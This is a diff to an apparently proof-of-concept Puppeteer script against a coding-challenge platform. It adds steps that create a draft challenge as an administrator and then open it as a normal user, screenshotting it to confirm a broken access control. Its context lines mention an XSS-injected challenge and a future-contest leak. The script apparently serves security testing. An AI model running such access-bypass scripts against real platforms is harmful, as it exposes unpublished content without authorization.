@@ -71,7 +71,47 @@ const futureContestEndpoint = await superUserPage.$eval(
   'td.actions:first-child a:nth-child(2)',
   (element) => element.getAttribute('href')
 );
-console.log({ futureContestUrl: futureContestEndpoint });
+console.log({ futureContestEndpoint: futureContestEndpoint });
+
+// Create draft challenge
+{
+  const body = JSON.stringify({
+    draft: 1,
+    difficulty: 1,
+    points: 10,
+    name: `Draft challenge ${new Date()}`,
+    description: 'Draft challenge',
+    html: 'test',
+    tests: [{ challenge_id: -1, name: '12', input: '12', output: '12', index: 0 }]
+  });
+
+  await fetch(createUrl('/admin/challenges/create'), {
+    credentials: 'include',
+    headers: {
+      Accept: 'application/json, text/plain, */*',
+      'Accept-Language': 'en-US,en;q=0.5',
+      'Sec-Fetch-Dest': 'empty',
+      'Sec-Fetch-Mode': 'no-cors',
+      'Sec-Fetch-Site': 'same-origin',
+      'Content-Type': 'application/json;charset=utf-8',
+      Pragma: 'no-cache',
+      'Cache-Control': 'no-cache',
+      Cookie: superUserCookie
+    },
+    body: body,
+    method: 'POST',
+    mode: 'cors'
+  });
+}
+
+// Get future challenge URL
+await superUserPage.goto(createUrl('/admin/challenges'));
+await superUserPage.waitForSelector('td.actions');
+const draftChallengeEndpoint = await superUserPage.$eval(
+  'td.actions:first-child a:nth-child(2)',
+  (element) => element.getAttribute('href')
+);
+console.log({ draftChallengeEndpoint: draftChallengeEndpoint });
 
 // Create an XSS injected challenge
 {
@@ -138,6 +178,19 @@ const userCookie = await login(userPage);
   await userPage.screenshot({ path: './future-contest.jpg' });
   console.log(
     'If the attack is successful, there will be a screenshot called future-contest.jpg with the content of the future contest'
+  );
+}
+
+// as normal user, access draft challenge
+{
+  console.log('Viewing a draft challenge as an unauthorized user attack');
+  await userPage.goto(
+    createUrl('/challenges/' + draftChallengeEndpoint.split('/').at(-1) + '/python')
+  );
+  await userPage.waitForSelector('.em_challenge');
+  await userPage.screenshot({ path: './draft-challenge.jpg' });
+  console.log(
+    'If the attack is successful, there will be a screenshot called draft-challenge.jpg with the content of the draft challenge'
   );
 }
 
